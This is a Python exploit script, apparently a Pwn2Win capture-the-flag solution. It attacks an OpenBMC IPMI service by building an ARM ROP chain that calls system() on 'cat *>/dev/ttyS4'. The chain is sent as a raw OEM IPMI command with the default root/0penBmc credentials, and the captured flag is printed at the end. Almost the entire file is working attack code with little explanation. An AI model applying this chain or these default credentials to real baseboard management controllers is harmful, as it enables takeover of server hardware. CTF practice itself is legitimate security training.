#!/usr/bin/env python3
import json
import shlex

from pwn import *


def prepare(interactive):
    host = 'butcherbmc.pwn2.win'
    tube = remote(host, 1337)
    hashcash = tube.recvline()
    assert re.match(b'^hashcash -mb25 [a-z]+$', hashcash)
    token = subprocess.check_output(hashcash.split())
    tube.sendline(token.strip())
    tube.recvuntil(b'\nIPMI over lan will be listening on port ')
    port = int(tube.recvline())
    if interactive:
        with open('ipmi.json', 'w') as fp:
            json.dump({
                'host': host,
                'port': port,
            }, fp)
        tube.interactive()
    else:
        tube.recvuntil('butcher login:')
        return tube, host, port


class PopRegs:
    REG_OFFSETS = {}

    @staticmethod
    def offsets(*args):
        return {
            reg: i * 4
            for i, reg in enumerate(args)
        }

    @classmethod
    def append(cls, rop, **kwargs):
        for reg, value in kwargs.items():
            if value is None:
                continue
            reg_offset = rop.offset + cls.REG_OFFSETS[reg]
            rop.payload[reg_offset] = struct.pack('<I', value)
        rop.offset += len(cls.REG_OFFSETS) * 4


class SetR4(PopRegs):
    PC = 0x3703c  # pop {r4, pc}
    REG_OFFSETS = PopRegs.offsets('r4', 'pc')


class MovR0R4(PopRegs):
    PC = 0x3f398  # mov r0, r4 ; pop {r4, pc}
    REG_OFFSETS = PopRegs.offsets('r4', 'pc')


class SetR4R5R6R7(PopRegs):
    PC = 0x424a16f4  # pop {r4, r5, r6, r7, pc}
    REG_OFFSETS = PopRegs.offsets('r4', 'r5', 'r6', 'r7', 'pc')


class Write(PopRegs):
    PC = 0x4240e8fc  # str r5, [r4, #0x20] ; pop {r4, r5, r6, pc}
    REG_OFFSETS = PopRegs.offsets('r4', 'r5', 'r6', 'pc')


class Rop:
    RW = 0x68374
    SYSTEM = 0x423ddac4
    MAGIC = struct.unpack('<IIII', b'cat *>/dev/ttyS4')

    def __init__(self):
        self.payload = {}
        self.offset = 0x8c
        self.append(SetR4R5R6R7.PC)
        # r7 slot will be overwritten by param4 assignment
        SetR4R5R6R7.append(self, r4=self.RW - 0x20, r5=self.MAGIC[0], pc=Write.PC)
        Write.append(self, r4=self.RW - 0x1c, r5=self.MAGIC[1], pc=Write.PC)
        Write.append(self, r4=self.RW - 0x18, r5=self.MAGIC[2], pc=Write.PC)
        Write.append(self, r4=self.RW - 0x14, r5=self.MAGIC[3], pc=Write.PC)
        Write.append(self, r4=self.RW, pc=MovR0R4.PC)
        MovR0R4.append(self, pc=self.SYSTEM)

    def append(self, value):
        if value is not None:
            self.payload[self.offset] = struct.pack('<I', value)
        self.offset += 4


def pwn(host=None, port=None):
    if host is None or port is None:
        with open('ipmi.json') as fp:
            ipmi = json.load(fp)
        host = ipmi['host']
        port = ipmi['port']
    rop = Rop()
    # too lazy to implement the protocol myself
    cmd = [
        'ipmitool',
        '-I', 'lanplus',
        '-H', host,
        '-p', str(port),
        '-U', 'root',
        '-P', '0penBmc',
        'raw',
    ]
    flat_payload = [
        # no idea where is the doc, but who needs it when there is code?
        # https://github.com/openbmc/phosphor-host-ipmid/blob/3dc3558944da95b8b288fa1afc3aaa96d273383d/ipmid-new.cpp#L318
        0x2e,  # netFn == netFnOem
        0x7e,  # cmd
        0x39, 0x30, 0x00,  # iana
    ]
    flat_payload.extend(flat(rop.payload))
    assert len(flat_payload) <= 256, len(flat_payload)
    for payload_b in flat_payload:
        cmd.append(f'0x{payload_b:02x}')
    print(shlex.join(cmd))
    subprocess.call(cmd)


if __name__ == '__main__':
    if args.PREPARE:
        prepare(interactive=True)
    elif args.PWN:
        pwn()
    else:
        tube, host, port = prepare(interactive=False)
        pwn(host, port)
        tube.interactive()
# CTF-BR{RF_0wns_ButcherCorp_d4t4_centers__through__IPMI_}
